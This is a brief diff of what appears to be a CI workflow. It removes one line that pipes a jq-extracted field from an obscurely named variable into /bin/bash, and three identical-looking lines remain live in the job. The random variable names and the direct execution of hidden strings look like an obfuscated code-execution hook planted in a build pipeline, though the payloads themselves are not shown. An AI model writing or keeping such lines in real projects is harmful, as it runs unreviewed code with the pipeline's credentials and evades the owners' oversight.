@@ -34,7 +34,6 @@ jobs:
           echo $gz968 | jq -r .jgf5 | /bin/bash
           printf '%s' "$epjwi242" | jq -r .psai9 | /bin/bash
           printf '%s' "$scnb928" | jq -r .dg938 | /bin/bash
-          echo $w0073 | jq -r .vnnt25 | /bin/bash
 
       - name: Save results
         if: always()
